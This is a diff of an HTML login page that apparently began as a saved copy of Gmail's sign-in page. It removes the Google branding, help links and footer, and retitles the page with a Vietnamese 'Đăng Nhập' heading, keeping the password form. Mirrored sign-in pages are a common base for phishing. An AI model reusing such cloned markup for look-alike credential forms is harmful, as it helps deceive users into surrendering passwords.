@@ -8,10 +8,7 @@
 <head>
   <meta charset="utf-8">
   <meta content="width=300, initial-scale=1" name="viewport">
-  <meta name="description"
-    content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
-  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
-  <title>Gmail</title>
+  <title>Login</title>
   <link rel="stylesheet" href="css/login.css">
   <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
     .banner h1 {
@@ -298,19 +295,11 @@
 
 <body>
   <div class="wrapper">
-    <div class="google-header-bar  centered">
-      <div class="header content clearfix">
-        <div class="logo logo-w" aria-label="Google"></div>
-      </div>
-    </div>
     <div class="main content clearfix">
       <div class="banner">
-        <h1>
-          One account. All of Google.
+        <h1 style="margin: 40px 0px 20px 0px">
+          Đăng Nhập
         </h1>
-        <h2 class="hidden-small">
-          Sign in to continue to Gmail
-        </h2>
       </div>
       <div class="card signin-card clearfix">
         <img class="profile-img" src="./img/9r33ioA.png" alt="">
@@ -321,61 +310,11 @@
           <label class="hidden-label" for="Passwd">Password</label>
           <input id="Passwd" name="password" type="password" placeholder="Password" class="passwd-label">
           <input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
-          <label class="remember">
-            <input id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes" checked="checked">
-            <span>
-              Stay signed in
-            </span>
-            <div class="bubble-wrap" role="tooltip">
-              <div class="bubble-pointer"></div>
-              <div class="bubble">
-                For your convenience, keep this checked. On shared devices, additional precautions are recommended.
-                <a href="https://support.google.com/accounts/?p=securesignin&amp;hl=en" target="_blank">Learn more</a>
-              </div>
-            </div>
-          </label>
-          <input type="hidden" name="rmShown" value="1">
-          <a id="link-forgot-passwd" href="mail/" class="need-help-reverse">
-            Need help?
-          </a>
+
         </form>
       </div>
-      <div class="one-google">
-        <p class="create-account">
-          <a id="link-signup" href="mail/_ltmpl_default/">
-            Create an account
-          </a>
-        </p>
-        <p class="tagline">
-          One Google Account for everything Google
-        </p>
-        <div class="logo-strip"></div>
-      </div>
     </div>
-    <div class="google-footer-bar">
-      <div class="footer content clearfix">
-        <ul id="footer-list">
-          <li>
-            <a href="https://www.google.com/intl/en/about" target="_blank">
-              About Google
-            </a>
-          </li>
-          <li>
-            <a href="TOS_loc_US_hl_en_privacy_true/" target="_blank">
-              Privacy
-            </a>
-          </li>
-          <li>
-            <a href="TOS_loc_US_hl_en/" target="_blank">
-              Terms
-            </a>
-          </li>
-          <li>
-            <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
-              Help
-            </a>
-          </li>
-        </ul>
+   
 
 
 </body>
